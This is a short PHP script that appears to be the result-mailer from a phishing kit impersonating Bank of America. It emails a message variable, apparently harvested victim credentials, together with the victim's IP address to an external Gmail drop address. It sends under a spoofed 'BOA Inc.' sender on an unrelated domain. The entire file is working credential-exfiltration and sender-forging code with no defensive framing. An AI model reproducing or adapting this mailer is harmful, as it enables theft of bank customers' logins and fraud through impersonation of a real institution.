<?php

$to = "xeridon10@gmail.com";
$subject = "B.O.A ReZult $ip";
$from = "From: BOA Inc.<newidea@malancellc.com>";

mail($to,$subject,$msg,$from);

?>